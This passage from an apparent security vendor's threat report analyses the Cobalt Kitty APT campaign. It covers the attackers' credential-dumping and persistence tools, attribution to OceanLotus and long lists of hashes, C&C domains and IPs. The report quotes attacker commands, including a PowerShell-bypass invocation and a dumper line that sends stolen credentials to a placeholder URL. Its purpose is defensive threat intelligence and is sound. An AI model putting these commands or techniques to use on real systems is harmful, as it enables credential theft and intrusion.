+known to threat intelligence engines at the time of the attack:  
+log.exe 
+[GetPassword_x64] 
+7f812da330a617400cb2ff41028c859181fe663f 
+  
+ 
+It’s even more interesting to see that even in 2017, almost three years after it was first uploaded 
+to VirusTotal, and two years after the same tool has been reported being used in an APT, it still 
+has a very low detection rate and it is misclassified as adware or Mimikatz:  
+ 
+ 
+ 
+Below is a screenshot of the tool’s output, dumping local users’ passwords:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+43 
+ 
+ 
+Custom “HookPasswordChange” 
+In an attempt to remain persistent on the network, the attackers introduced a new tool that alerts 
+them if a compromised account password was changed. The attackers borrowed the idea and a 
+lot of the code from a known publicly available tool called “HookPasswordChange”, which was 
+inspired by a previous work done by “carnal0wnage”. The original tool hooks Windows 
+“PasswordChangeNotify” in Windows’ default password filter (rassfm.dll). By doing so, every 
+time this function is called, it will be redirected to the malicious PasswordChangeNotify function, 
+which in turn will copy the changed password to a file and then return the execution back to the 
+original PasswordChangeNotify function, allowing the password to be changed.  
+ 
+The observed payloads are:  
+ 
+SRCHUI.dll - 29BD1BAC25F753693DF2DDF70B83F0E183D9550D 
+Adrclients.dll - FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642 
+ 
+As can be seen, the internal names of the DLL files is “Password.exe”.  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+44 
+The exported functions of the malicious DLLs include the malicious code to hook rassfm.dll’s 
+password change functions:  
+ 
+ 
+ 
+Following are strings extracted from the malicious binaries, indicating the hooking of rassfm.dll’s 
+PasswordChangeNotify functions: 
+  
+ 
+ 
+However, the code was not taken as is. The attackers made quite a few modifications, most of 
+them are “cosmetic”,  like changing functions names and logging strings, as well as adding 
+functionality to suit their needs.  
+ 
+ 
+Custom Outlook credential dumper 
+The attackers showed particular interest in obtaining the Outlook passwords of their victims. To 
+do so, they wrote a custom credential dumper in PowerShell that focused on Outlook. Analysis 
+of the code clearly shows that the attackers borrowed code from a known Windows credential 
+dumper and modified it to fit their needs. 
+The payloads used are the following PowerShell scripts:  
+ 
+C:\ProgramData\doutlook.ps1 - 
+EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+45 
+C:\ProgramData\adobe.dat - B769FE81996CBF7666F916D741373C9C55C71F15 
+ 
+ 
+ 
+Since PowerShell execution was disabled at this stage of the attack, they attackers executed 
+the PowerShell script via a tool called PSUnlock that enabled them to bypass PowerShell 
+execution restrictions. This was done as follows:  
+rundll32 PShdll35.dll,main -f doutlook.ps1 
+ 
+ 
+ 
+The dumped strings of the Rundll32 process teach us two important things:  
+1. The attackers wrote a binary tool and then ported it to PowerShell, using PowerSploit’s 
+“Invoke-ReflectivePEInjection”. 
+2. The attackers preconfigured the tools to write the output to ProgramData folder, where 
+they hid most of their tools 
+ 
+Doutlook.ps1:  
+(0x2f815f0 (194): Invoke-ReflectivePEInjection -PEBytes $RawPEFile -ExeArgs '-o 
+c:\programdata\log.txt' -ForceASLR 
+ 
+Example of the output of the the PowerShell script shows the direct intent to obtain Outlook 
+passwords:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+46 
+ 
+ 
+The tool is designed to recover Outlook passwords stored in Windows registry:  
+HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging 
+Subsystem\Profiles 
+HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook 
+ 
+ 
+ 
+This technique is well known and was used in different tools such as SecurityXploded’s: 
+http://securityxploded.com/outlookpasswordsecrets.php 
+http://securityxploded.com/outlook-password-dump.php 
+ 
+In addition, they also used borrowed code from Oxid’s Windows Vault Password Dumper, 
+written by Massimiliano Montoro, as can be clearly seen in the dumped strings from memory:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+47 
+ 
+The original code from Oxid’s Windows Vault Password Dumper matches the strings found in 
+memory:  
+ 
+Custom Windows credential dumper 
+The attackers wrote a custom Windows credential dumper, which is a patchwork of two known 
+dumping tools along with their own code. This password dumper borrows much of its code from 
+Oxid’s Windows Vault Password Dumper as well as Oxid’s creddump project.   
+ 
+The observed payloads are:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+48 
+Adrclients.ps1 - 6609A347932A11FA4C305817A78638E07F04B09F 
+KB471623.exe - 6609A347932A11FA4C305817A78638E07F04B09F 
+ 
+The PowerShell version reveals the command-line arguments that the attackers need to supply 
+the program:  
+Invoke-ReflectivePEInjection -PEBytes $RawPEFile -ExeArgs '/s http://example.com/q= /l 
+C:\programdata\log.txt /d C:\programdata\adrclients.dll' -ForceASLR} 
+ 
+● URL - to post the dumped credentials in GET parameters 
+● Log file - log all dumped credentials in a file called “log.txt” created in programdata 
+● DLL - to load HookPasswordChange payload  
+ 
+This above command line arguments do not appear in the code of the two aforementioned 
+Oxid’s projects. It was added by the attackers in order to include exfiltration over HTTP along 
+with the ability to combine the HookPasswordChange functionality.  
+ 
+Example of strings found in the binaries of the custom credential dumper:  
+ 
+ 
+Modified NetCat 
+The attackers used a customized version of the famous “Netcat” aka, tcp/ip "Swiss 
+Army knife", which was taken from GitHub. The tool was executed on very few machines, 
+and was uploaded to the compromised machines by the backdoor (goopdate.dll):  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+49 
+ 
+File names: kb74891.exe, kb-10233.exe 
+SHA-1 Hash: c5e19c02a9a1362c67ea87c1e049ce9056425788 
+The attackers named the executable “kb-10233.exe”, masquerading as a Windows 
+update file. Netcat is usually detected by most of security products as a hacktool. 
+however, this version is only detected by one antivirus vendor, and this is most likely the 
+reason the attackers chose to use it.   
+https://virustotal.com/en/file/bf01148b2a428bf6edff570c1bbfbf51a342ff7844ceccaf22c0
+e09347d59a54/analysis/ 
+ 
+ 
+ 
+Custom IP check tool 
+The attackers used an unknown tool, whose purpose is simply to check the external IP 
+of the compromised machine:   
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+50 
+ 
+ 
+It’s interesting that the attackers renamed the executable twice from ip.exe to 
+dllhost.exe or cmd.exe, probably to make it appear less suspicious by giving it 
+common Windows executables names:  
+c:\programdata\dllhost.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2 
+c:\programdata\cmd.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2 
+c:\programdata\ip.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2 
+ 
+The IP tool was deployed by the attackers in the attack’s second phase. The product 
+name “WindowsFormsApplication1”, strongly suggests that the tool was written using 
+Microsoft’s .NET framework: 
+  
+ 
+ 
+The code is very short and straight-forward and clearly reveals the tool’s purpose:  
+checking the external IP of the compromised machine using the well-known IP service 
+ipinfo.io.  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+51 
+ 
+ 
+ 
+©2016 Cybereason. All rights reserved. 
+1
+Operation Cobalt Kitty
+Threat Actor Profile & 
+Indicators of Compromise
+By: Assaf Dahan
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+1 
+Attribution 
+In this APT, the threat actor was very aware of the risks of exposure and tried to combat 
+attribution as much as possible. This is often the case in this type of large-scale cyber 
+espionage operations. At the time of the attack, there weren’t many classic indicators of 
+compromise (IOCs) that could lead to attribution. However, at the same time, the threat actors 
+behind Operation Cobalt Kitty left enough “behavioral fingerprints” to suspect the involvement of 
+the OceanLotus Group (which also goes by the names APT-C-00, SeaLotus  and APT32), 
+which was first documented by Qihoo 360's SkyEye Labs in 2015 and further researched by 
+other security companies, including FireEye’s report. Reports of the group’s activity in Asia date 
+back to 2012, attacking Chinese entities. Over the years, the group was observed attacking a 
+wide spectrum of targets in other Asian countries (Philippines and Vietnam). Cybereason 
+concludes that the tactics, techniques and procedures (TTPs) observed throughout operation 
+Cobalt Kitty are consistent with the group’s previous APT campaigns in Asia.  
+ 
+The Lotus Group appears to have a tendency of using similar and even identical names for their 
+payloads (seen in their PowerShell payloads, Denis backdoor and fake Flash installers). In 
+addition, they also used similar anonymization services for their domains repeatedly. That type 
+of “small” details also played a role in attributing Operation Cobalt Kitty to the OceanLotus 
+Group.  
+ 
+Lastly, during the investigation, Cybereason noticed that some of the C&C domains and IPs 
+started to emerge on VirusTotal and other threat intelligence engines, with payloads that were 
+not observed during Cobalt Kitty. This was a cutting proof that Cobalt Kitty was not an isolated 
+APT, but part of something bigger. Example of the C&C domains and IPs used by the group 
+across different APT campaigns and caught in the wild:  
+ 
+*.chatconnecting(.)com 
+blog.versign(.)com 
+vieweva(.)com 
+tulationeva(.)com 
+teriava(.)com 
+tonholding(.)com 
+nsquery(.)net 
+notificeva(.)com 
+23.227.196(.)210 
+104.237.218(.)72 
+45.114.117(.)137 
+ 
+Some of these domains were also mentioned in FireEye’s APT32 report, further confirming our 
+suspicions that the group behind the attack is the OceanLotus Group.  
+ 
+The group includes members who are fluent in at least two Asian languages. This claim is 
+supported by the language used in the spear-phishing emails, which appear to be written by 
+native speakers. In addition, the  language localization settings found in few of the payloads 
+suggest that the malware authors compiled the payloads on machines with Asian languages 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+2 
+support. The threat actors are not likely native English speakers since multiple typos were found 
+in their payloads.  
+ 
+For example, the following typo was observed in the file metadata of one of the backdoors. 
+Notice the “Internal Name” field (“Geogle Update”):  
+ 
+Threat Actor Profile 
+The attackers behind Operation Cobalt Kitty were extremely persistent. Even when their 
+campaign was exposed, the attackers did not give up. They took “pauses” that lasted between 
+48 hours and four weeks and used the downtime to learn from their “mistakes” and develop 
+workarounds before resuming the APT campaign.  
+ 
+The members of the OceanLotus Group demonstrated a remarkable ability to quickly adapt, 
+introduce new tools and fine tune existing ones to bypass security solutions and avoid detection. 
+The high number of payloads and the elaborate C2 infrastructure used in this attack can be 
+indicative of the resources that the attackers had at their disposal. Simultaneously orchestrating 
+multiple APT campaigns of such magnitude and sophistication takes time, financial resources 
+and a large team who can support it.  
+ 
+Threat actor’s main characteristics  
+Here are the main characteristics that can help profile the threat actor:  
+ 
+● Motivation - Based on the nature of the attack, the proprietary information that the 
+attackers were after and the high-profile personnel who were targeted, Cybereason 
+concluded the main motivation behind the attack was cyber espionage. The attacker 
+sought after specific documents and type of information. This is consistent with previous 
+reports about the group’s activity show that the group has a very wide range of targets, 
+spanning from government agencies, media, business sector, and more.  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+3 
+● Operational working hours - Most of the malicious activity was mostly done around 
+normal business hours (8AM-8PM). Very little active hacking activity was detected 
+during weekends. The attackers showed a slight tendency to carry out hacking 
+operations towards the afternoon and evening time. These observations can suggest the 
+following:  
+○ Time zone(s) proximity.  
+○ An institutionalized threat actor (possibly nation-state) 
+● Outlook backdoor and data exfiltration - One of the most interesting tools introduced 
+by the attackers was the Outlook backdoor, which used Outlook as a C2 channel. This 
+backdoor has not been publicly documented and is one of the most unique TTPs with 
+regards to the threat actor. Outlook backdoors are not a new concept and have been 
+observed in different APTs in the past. However, this specific type of Outlook backdoor 
+is can be considered as one of the “signature tools” of the OceanLotus Group. 
+ 
+● Publicly available tools - The attackers showed a clear preference to use publicly 
+available hacking tools and frameworks. Beyond being spared the hassle of creating a 
+new tool, it is much harder to attribute a tool that can be used by anyone rather than a 
+custom-made tool. However, the attackers should not be considered script-kiddies. Most 
+of the publicly available tools were either obfuscated, modified and even merged with 
+other tools to evade antivirus detection. This type of customization requires good coding 
+skills and understanding of how those tools work.  
+ 
+● Cobalt Strike usage in APT - Cobalt Strike is a commercial offensive security 
+framework designed to simulate complex attacks and is mainly used by security 
+professionals in security audits and penetration testing. The OceanLotus Group was 
+previously documented using Cobalt Strike as one of its main tools. Other Large scale 
+APTs using Cobalt Strike have been reported before, such as  APT-TOCS (could be 
+related to OceanLotus), Ordinaff, Carbanak Group, and the Cobalt Group.   
+ 
+● Custom-built backdoors - The threat actor used very sophisticated and stealthy 
+backdoors (Denis & Goopy) that were written by highly skilled malware authors. During 
+the attack, the authors introduced new variants of these backdoors, indicating “on-the-
+fly” development capabilities. Developing such state-of-the-art backdoors requires skillful 
+malware authors, time and resources. In addition, both the Denis and Goopy backdoors 
+used DNS Tunneling for C2 communication. The OceanLotus Group is known to have a 
+backdoor dubbed SOUNDBITE by FireEye that use this stealthy technique. However, no 
+public analysis reports of SOUNDBITE is available to the time of writing this report.   
+ 
+● Exploiting DLL hijacking in trusted applications - The attackers exploited three DLL-
+hijacking vulnerabilities in legitimate applications from trusted vendors: Microsoft, 
+Google and Kaspersky. This further indicates the group’s emphasis on vulnerability 
+research. DLL-hijacking / Side-loading attacks are not uncommon in APTs, some of 
+which are also carried out by nation-state actors and advanced cyber-crime groups. 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+4 
+There have been reports in the past of GoogleUpdate exploited by PlugX by Chinese 
+threat actors as well as the Bookworm RAT exploiting Microsoft and Kaspersky 
+applications in APTs targeting Asia.  
+ 
+● Insisting on fileless operation - While fileless delivery infrastructure is not a feature 
+that can be attributed to one specific group, it is still worth mentioning since the attackers 
+went out of their way to restore the script-based PowerShell / Visual Basic operation, 
+especially after PowerShell execution had been disabled in the entire organization.  
+● C&C infrastructure 
+○ Divide and conquer - Each tool communicated with different sets of C&C 
+servers domains, which usually came in triads. For instance, Cobalt strike 
+payloads communicated with certain sets of IPs/domains while the backdoors 
+communicated with different sets of IPs/domains.   
+○ Re-use of domains and IPs across campaigns - Quite a few domains and IPs 
+that were observed in Operation Cobalt Kitty were found in-the-wild, attacking 
+other targets. It’s rather peculiar why the threat actor re-used the same domains 
+and IPs. It could be assumed that the malware operators wanted to have  
+centralized C&C servers per tool or tools, where they could monitor all of their 
+campaigns from dedicated servers.  
+○ Anonymous DNS records - Most of the domains point to companies that 
+provide DNS data privacy and anonymization, such as PrivacyProtect and 
+PrivacyGuardian.  
+○ C&C server protection - Most of the C&C servers IP addresses are protected 
+by  CloudFlare and SECURED SERVERS LLC. 
+ 
+OceanLotus Group activity in Asia  
+As part of the analysis of the domains and IPs that were used in this operation, Cybereason 
+found samples that were caught “in-the-wild” (that were not part of Operation Cobalt Kitty). 
+Analysis of those samples clearly indicates the involvement of the threat actor in Asia and 
+Vietnam in particular. Both Qihoo 360 and FireEye demonstrate in their reports  that the threat 
+actor is involved in campaigns in different Asian countries, such as Vietnam, China, and the 
+Philippines.  
+ 
+Most of the samples caught in-the-wild seem to target Vietnamese speakers. Some of the 
+samples exhibit clear evidence of targeting Vietnamese entities. This conclusion is derived from 
+the file names and file contents that are written in Vietnamese, as shown in the examples below: 
+ 
+File Name: Điện thoại bị cháy.doc 
+SHA-1: 38297392df481d2ecf00cc7f05ce3361bd575b04 
+Malicious Domain / IP:  193.169.245(.)137 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+5 
+ 
+ 
+File Name: ID2016.doc 
+SHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc 
+Malicious Domain / IP: support.chatconnecting(.)com 
+ 
+ 
+ 
+ 
+File Name: Giấy yêu cầu bồi thường mới 2016 - Hằng.doc (Translation: “New Claim Form 2016”) 
+SHA-1: A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c 
+Malicious Domain / IP: blog.versign(.)info 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+6 
+Indicators of Compromise (IOCs) 
+Malicious files 
+Backdoors 
+File name 
+SHA-1 hash 
+Msfte.dll 
+------------- 
+Variant of 
+Backdoor.Win32.Denis 
+be6342fc2f33d8380e0ee5531592e9f676bb1f94 
+638b7b0536217c8923e856f4138d9caff7eb309d  
+dcbe007ac5684793ea34bf27fdaa2952c4e84d12 
+43b85c5387aafb91aea599782622eb9d0b5b151f 
+Goopdate.dll 
+----------------- 
+Goopy backdoor 
+9afe0ac621c00829f960d06c16a3e556cd0de249 
+973b1ca8661be6651114edf29b10b31db4e218f7 
+1c503a44ed9a28aad1fa3227dc1e0556bbe79919 
+2e29e61620f2b5c2fd31c4eb812c84e57f20214a 
+c7b190119cec8c96b7e36b7c2cc90773cffd81fd 
+185b7db0fec0236dff53e45b9c2a446e627b4c6a 
+ef0f9aaf16ab65e4518296c77ee54e1178787e21 
+product_info.dll 
+[Backdoor exploiting DLL-hijacking 
+against  Kaspersky Avpia] 
+3cf4b44c9470fb5bd0c16996c4b2a338502a7517 
+VbaProject.OTM 
+[Outlook Macro] 
+320e25629327e0e8946f3ea7c2a747ebd37fe26f 
+sunjavascheduler.ps1 
+sndVolSSO.ps1 
+SCVHost.ps1 
+fhsvcs.ps1 
+Goztp.ps1 
+ 
+[PowerShell versions of the Denis 
+/ Goopy backdoors] 
+0d3a33cb848499a9404d099f8238a6a0e0a4b471 
+c219a1ac5b4fd6d20a61bb5fdf68f65bbd40b453 
+91e9465532ef967c93b1ef04b7a906aa533a370e 
+ 
+Cobalt Strike Beacons 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+7 
+File name 
+SHA-1 hash 
+dns.exe 
+cd675977bf235eac49db60f6572be0d4051b9c07 
+  
+msfte.dll 
+2f8e5f81a8ca94ec36380272e36a22e326aa40a4 
+FVEAPI.dll 
+01197697e554021af1ce7e980a5950a5fcf88318 
+sunjavascheduler.ps1 
+syscheck.ps1 
+dns.ps1 
+activator.ps1 
+nvidia.db 
+7657769f767cd021438fcce96a6befaf3bb2ba2d 
+Ed074a1609616fdb56b40d3059ff4bebe729e436 
+D667701804CA05BB536B80337A33D0714EA28129 
+F45A41D30F9574C41FE0A27CB121A667295268B2 
+7F4C28639355B0B6244EADBC8943E373344B2E7E 
+Malicious Word Documents 
+***Some of the phishing emails and Word documents were very targeted and 
+personalized, therefore, they are not listed here for privacy reasons 
+File name 
+SHA-1 hash 
+CV.doc 
+Complaint letter.doc 
+License Agreement.doc 
+[redacted] 
+Loader scripts 
+File name 
+SHA-1 hash 
+syscheck.vbs 
+ 
+62749484f7a6b4142a2b5d54f589a950483dfcc9 
+SndVolSSO.txt 
+cb3a982e15ae382c0f6bdacc0fcecf3a9d4a068d 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+8 
+sunjavascheduler.txt 
+7a02a835016bc630aa9e20bc4bc0967715459daa 
+Obfuscated / customized Mimikatz 
+File name 
+SHA-1 hash 
+dllhosts.exe 
+5a31342e8e33e2bbe17f182f2f2b508edb20933f 
+23c466c465ad09f0ebeca007121f73e5b630ecf6 
+14FDEF1F5469EB7B67EB9186AA0C30AFAF77A07C 
+KB571372.ps1 
+7CADFB90E36FA3100AF45AC6F37DC55828FC084A 
+KB647152.exe 
+7BA6BFEA546D0FC8469C09D8F84D30AB0F20A129 
+KB647164.exe  
+BDCADEAE92C7C662D771507D78689D4B62D897F9 
+kb412345.exe 
+ e0aaa10bf812a17bb615637bf670c785bca34096 
+kb681234.exe 
+ 4bd060270da3b9666f5886cf4eeaef3164fad438 
+System.exe 
+33cb4e6e291d752b9dc3c85dfef63ce9cf0dbfbc 
+550f1d37d3dd09e023d552904cdfb342f2bf0d35 
+decoded base64 
+Mimikatz payload 
+c0950ac1be159e6ff1bf6c9593f06a3f0e721dd4 
+Customized credential dumpers 
+File name 
+SHA-1 hash 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+9 
+log.exe 
+[GetPassword_x64] 
+7f812da330a617400cb2ff41028c859181fe663f 
+  
+SRCHUI.dll  
+adrclients.dll  
+[HookPasswordChange] 
+29BD1BAC25F753693DF2DDF70B83F0E183D9550D 
+FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642 
+KB471623.exe 
+[Custom password dumper] 
+6609A347932A11FA4C305817A78638E07F04B09F 
+doutlook.ps1 
+adobe.dat  
+adrclients.ps1  
+[Custom password dumper] 
+EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD 
+B769FE81996CBF7666F916D741373C9C55C71F15 
+E64C2ED72A146271CCEE9EE904360230B69A2C1D 
+ 
+Miscellaneous tools 
+File name 
+SHA-1 hash 
+pshdll35.dll 
+pshdll40.dll 
+[PSUnlock - PowerShell Bypass 
+tool] 
+52852C5E478CC656D8C4E1917E356940768E7184 
+EDD5D8622E491DFA2AF50FE9191E788CC9B9AF89 
+KB-10233.exe 
+kb74891.exe 
+[NetCat] 
+C5e19c02a9a1362c67ea87c1e049ce9056425788 
+0908a7fbc74e32cded8877ac983373ab289608b3 
+IP.exe 
+cmd.exe 
+dllhost.exe  
+[IP check Tool] 
+6aec53554f93c61f4e3977747328b8e2b1283af2 
+ 
+Payloads from C&C servers 
+ 
+URL 
+Payload SHA-1 hash 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+10 
+hxxp://104.237.218(.)67:80/icon.ico 
+6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09 
+hxxp://support.chatconnecting(.)com:80/icon.ico 
+c41972517f268e214d1d6c446ca75e795646c5f2 
+hxxp://food.letsmiles(.)org/login.txt 
+9f95b81372eaf722a705d1f94a2632aad5b5c180 
+hxxp://food.letsmiles(.)org/9niL 
+5B4459252A9E67D085C8B6AC47048B276C7A6700 
+hxxp://23.227.196(.)210:80/logscreen.jpg 
+d8f31a78e1d158032f789290fa52ada6281c9a1f 
+50fec977ee3bfb6ba88e5dd009b81f0cae73955e 
+hxxp://45.114.117(.)137/eXYF 
+D1E3D0DDE443E9D294A39013C0D7261A411FF1C4 
+91BD627C7B8A34AB334B5E929AF6F981FCEBF268 
+hxxp://images.verginnet(.)info:80/ppap.png 
+F0A0FB4E005DD5982AF5CFD64D32C43DF79E1402 
+hxxp://176.107.176(.)6/QVPh 
+8FC9D1DADF5CEF6CFE6996E4DA9E4AD3132702C 
+hxxp://108.170.31(.)69/a 
+4a3f9e31dc6362ab9e632964caad984d1120a1a7 
+hxxp://support(.)chatconnecting(.)com/pic.png 
+bb82f02026cf515eab2cc88faa7d18148f424f72 
+hxxp://blog.versign(.)info/access/?version=4&lid=[reda
+cted]&token=[redacted] 
+9e3971a2df15f5d9eb21d5da5a197e763c035f7a 
+hxxp://23.227.196(.)210/6tz8 
+bb82f02026cf515eab2cc88faa7d18148f424f72 
+hxxp://23.227.196(.)210/QVPh 
+8fc9d1dadf5cef6cfe6996e4da9e4ad3132702c5 
+hxxp://45.114.117(.)137/3mkQ 
+91bd627c7b8a34ab334b5e929af6f981fcebf268 
+hxxp://176.223.111(.)116:80/download/sido.jpg 
+  
+5934262D2258E4F23E2079DB953DBEBED8F07981 
+hxxp://110.10.179(.)65:80/ptF2 
+DA2B3FF680A25FFB0DD4F55615168516222DFC10 
+hxxp://110.10.179(.)65:80/download/microsoftp.jpg 
+23EF081AF79E92C1FBA8B5E622025B821981C145 
+hxxp://110.10.179(.)65:80/download/microsoft.jpg 
+C845F3AF0A2B7E034CE43658276AF3B3E402EB7B 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+11 
+hxxp://27.102.70(.)211:80/image.jpg 
+9394B5EF0B8216528CED1FEE589F3ED0E88C7155 
+C&C IPs 
+45.114.117(.)137 
+104.24.119(.)185  
+104.24.118(.)185 
+23.227.196(.)210  
+23.227.196(.)126 
+184.95.51(.)179  
+176.107.177(.)216 
+192.121.176(.)148 
+103.41.177(.)33 
+184.95.51(.)181 
+23.227.199(.)121 
+108.170.31(.)69 
+104.27.167(.)79 
+104.27.166(.)79 
+176.107.176(.)6 
+184.95.51(.)190 
+176.223.111(.)116 
+110.10.179(.)65 
+27.102.70(.)211 
+C&C Domains 
+food.letsmiles(.)org 
+help.chatconnecting(.)com 
+*.letsmiles(.)org 
+support.chatconnecting(.)com 
+inbox.mailboxhus(.)com 
+blog.versign(.)info 
+news.blogtrands(.)net 
+stack.inveglob(.)net 
+tops.gamecousers(.)com  
+nsquery(.)net 
+tonholding(.)com 
+cloudwsus(.)net 
+nortonudt(.)net 
+teriava(.)com 
+tulationeva(.)com  
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+12 
+vieweva(.)com 
+notificeva(.)com  
+images.verginnet(.)info 
+id.madsmans(.)com 
+lvjustin(.)com 
+play.paramountgame(.)com 
+Appendix A: Threat actor payloads caught in the wild 
+Domain 
+Details 
+VirusTotal  
+inbox.mailboxhus(.)com 
+support.chatconnecting(.)com 
+(45.114.117.137) 
+File name: Flash.exe 
+SHA-1: 01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09 
+Submitted: 2016-12-28 09:51:13 
+Link 
+inbox.mailboxhus(.)com 
+support.chatconnecting(.)com 
+(45.114.117[.]137) 
+File name: Flash.exe 
+SHA-1: 
+562aeced9f83657be218919d6f443485de8fae9e 
+Submitted: 2017-01-18 19:00:41 
+Link 
+support.chatconnecting(.)com 
+(45.114.117[.]137) 
+URL: hxxp://support(.)chatconnecting.com/2nx7m 
+Submitted: 2017-01-20 10:11:47 
+Link 
+support.chatconnecting(.)com 
+(45.114.117[.]137) 
+File name: ID2016.doc 
+SHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc 
+Submitted: 2016-11-23 08:18:43 
+ 
+Malicious Word document (Phishing text in Vietnamese) 
+Link 
+ 
+ 
+ 
+ 
+blog(.)versign(.)info 
+(23.227.196[.]210) 
+File name: tx32.dll 
+SHA-1: 
+604a1e1a6210c96e50b72f025921385fad943ddf 
+Submitted: 2016-08-15 04:04:46 
+ 
+Link 
+blog(.)versign(.)info 
+(23.227.196[.]210) 
+File name: Giấy yêu cầu bồi thường mới 2016 - Hằng.doc 
+SHA-1: 
+a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c 
+Submitted: 2016-10-06 11:03:54 
+ 
+Malicious Word document with Phishing text in 
+Vietnamese 
+ 
+Link 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+13 
+blog(.)versign(.)info 
+(23.227.196[.]210) 
+File name: Thong tin.doc 
+SHA-1: a5fbcbc17a1a0a4538fd987291f8dafd17878e33 
+Submitted: 2016-10-25 
+ 
+Malicious Word document with Phishing text in 
+Vietnamese 
+Link 
+ 
+Images.verginnet(.)info 
+id.madsmans(.)com 
+(176.107.176[.]6) 
+File name: WinWord.exe 
+SHA-1: 
+ea67b24720da7b4adb5c7a8a9e8f208806fbc198 
+Submitted:  
+ 
+Cobalt Strike payload  
+Downloads hxxp://images.verginnet(.)info/2NX7M 
+Using Cobalt Strike malleable c2 oscp profile 
+Link 
+ 
+tonholding(.)com 
+nsquery(.)net 
+File name: SndVolSSO.exe 
+SHA-1: 1fef52800fa9b752b98d3cbb8fff0c44046526aa 
+Submitted: 2016-08-01 09:03:58 
+ 
+Denis Backdoor Variant 
+Link 
+tonholding(.)com 
+nsquery(.)net 
+File name: Xwizard / KB12345678.exe 
+SHA-1: 
+d48602c3c73e8e33162e87891fb36a35f621b09b 
+Submitted: 2016-08-01 
+Link 
+teriava(.)com 
+File name: CiscoEapFast.exe 
+SHA-1: 
+77dd35901c0192e040deb9cc7a981733168afa74 
+Submitted: 2017-02-28 16:37:12 
+ 
+Denis Backdoor Variant 
+Link 
+ 
+Appendix B: Denis Backdoor samples in the wild 
+File name 
+SHA-1 
+Domain 
+msprivs.exe 
+97fdab2832550b9fea80ec1b9
+c182f5139e9e947 
+teriava(.)com 
+WerFault.exe 
+F25d6a32aef1161c17830ea0c
+b950e36b614280d 
+teriava(.)com 
+msprivs.exe 
+1878df8e9d8f3d432d0bc8520
+595b2adb952fb85 
+teriava(.)com 
+CiscoEapFast.exe 
+094.exe 
+1a2cd9b94a70440a962d9ad7
+8e5e46d7d22070d0  
+teriava(.)com, 
+tulationeva(.)com, 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+14 
+notificeva(.)com 
+CiscoEapFast.exe 
+77dd35901c0192e040deb9cc
+7a981733168afa74  
+teriava(.)com, 
+tulationeva(.)com, 
+notificeva(.)com 
+SwUSB.exe 
+F:\malware\Anh 
+Dương\lsma.exe 
+88d35332ad30964af4f55f1e44
+c951b15a109832 
+gl-appspot(.)org 
+tonholding(.)com 
+nsquery(.)net 
+Xwizard.exe 
+KB12345678.exe 
+ 
+ 
+d48602c3c73e8e33162e8789
+1fb36a35f621b09b  
+tonholding(.)com 
+nsquery(.)net 
+SndVolSSO.exe 
+1fef52800fa9b752b98d3cbb8ff
+f0c44046526aa  
+tonholding(.)com 
+nsquery(.)net 
+ 
+©2016 Cybereason. All rights reserved. 
+2
+Cybereason is the leader in endpoint protection, offering endpoint detection and response, next-generation antivirus, and 
+active monitoring services. Founded by elite intelligence professionals born and bred in offense-first hunting, Cybereason gives 
+enterprises the upper hand over cyber adversaries. The Cybereason platform is powered by a custom-built in-memory graph, 
+the only truly automated hunting engine anywhere. It detects behavioral patterns across every endpoint and surfaces malicious 
+operations in an exceptionally user-friendly interface. Cybereason is privately held and headquartered in Boston with offices in 
+London, Tel Aviv, and Tokyo.
